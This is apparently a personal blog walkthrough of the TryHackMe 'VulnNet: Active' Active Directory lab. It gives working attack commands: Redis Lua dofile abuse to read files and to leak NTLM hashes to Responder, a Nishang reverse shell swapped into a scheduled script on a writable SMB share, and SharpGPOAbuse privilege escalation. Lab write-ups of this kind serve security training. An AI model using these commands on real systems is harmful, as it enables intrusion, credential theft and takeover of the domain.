---
title: "Vulnet active tryhackme"
date:  2023-04-12 15:04:23
categories: [active directory]
tags: [active directory]
---


**Enumeration**

This room on tryhackme is all about active directory and domain controller. So let's begin our machine with Nmap scanning.

![enum](https://prabinsigdel.com.np/images/enum.jpg)

Every domain controller services are up and running which is part of AD DC. But `Kerberos` is not running so we can not [AS-REP](https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/) roasting the usernames to check if they are valid.
I ran the Nmap to scan all ports.

![enum](https://prabinsigdel.com.np/images/nmap_all.jpg)

Here many ports are open so it is always beneficial to check for all ports. RPC and LDAP services are also running, Smb is a very good option to start with and I did the same.

**SMB port 445 enumeration**

But unfortunately, we got access denied for every possible command of `smbclient, smbmap, and netexec` to enumerate users' share on smb port 445.
It confirms that no guest and a null session are allowed.

**Redis exploitation**

But my eyes got on to port 6379 (Redis). I was unaware of this but [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) are always a good option to search for anything.
Redis is a No-sql database that stores information alongside key-value called keyspaces. The version of Redis key-value store 2.8.2402 is vulnerable to ssrf + CRLF.

![redis](https://prabinsigdel.com.np/images/redis.jpg)

Here we can exploit Redis via ssrf, but we must know the path to the windows server files
`redis-cli -h 10.10.245.19 eval "dofile('C:\\\Users\\\enterprise-security\\\Desktop\\\users.txt')" 0`

![redis](https://prabinsigdel.com.np/images/redis_exp.jpg)

we got the users.txt flag. If we can get any files why not exploit further to get Authenticated user's NTLM hash? If we forge redis to connect back to our attacking machine, maybe users' hashes will be exposed.
I set up the responder from impacket, when users from the Redis server try to connect to our machine responder will log the hashes.

`sudo responder -I 10.9.0.31`

`redis-cli -h 10.10.245.19 eval "dofile('//10.9.0.31/test')" 0`

![responder](https://prabinsigdel.com.np/images/responder.jpg)
Since we got the user enterprise-security hash, we cracked with john the ripper and got the password.

**SMB port 445 enumerations 2nd round**

We have now a username and password, so we can enumerate allowed shares on smbserver. I tried to log into enterprise-Share on smb and successfully logged in.
`smbmap -H 10.10.155.156 -u enterprise-security -p pass`

![smbmap](https://prabinsigdel.com.np/images/smbmap.jpg)

`smbclient //10.10.155.156/enterprise-share -U 'enterprise-security' pass`

![smbclient](https://prabinsigdel.com.np/images/smbclient.jpg)

There is a Powershell script scheduled to run, PurgeIrrelevantData_1826.ps1 with content.
`rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue`

Maybe we can replace this script with a reverse shell. We do have written permission for this share.

**Initial foothold**

We use [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) reverse shell to replace PurgeIrrelevantData_1826.ps1 and put it on the smb server overriding the same file and setting up Netcat listener to catch the shell.
Add this line to the bottom of the script and wait for netcat to catch the shell.

`Invoke-PowerShellTcp -Reverse -IPAddress 10.9.0.31 -Port 4444`

`nc -lvnp 4444`

![shell](https://prabinsigdel.com.np/images/shell.jpg)

Finally, we got reverse shell as enterprise security for the windows server.

**Privilege Escalation**

When I get the foothold on the machine, I always start with winPEAS.exe and it does give me some useful information which is SeImpersonatePrivilege.
I collect domain info with bloodhound-python and upload it to the bloodhound for analyzing users, groups, and domains.
![bloodhound](https://prabinsigdel.com.np/images/bloodhound.jpg)

Here is the shortest path to the admin where we will be abusing one of the `GPO(group policy object)` on which we can edit users' permission, local groups, memberships, and computer tasks.
We use `SharpGPOAbuse.exe` to escalate our privilege.

`.\SharpGPOAbuse.Exe AddComputerTask TaskName "babbadeckl_privesc" 
Author vulnnet\administrator Command "cmd.exe" Arguments "/c net localgroup administrators enterprise-security /add" GPOName "SECURITY-POL-VN"`

`gpupdate \force`

We can access admin via smbclient.
`smbclient //10.10.56.175/C$ -U 'enterprise-security' sand_………..`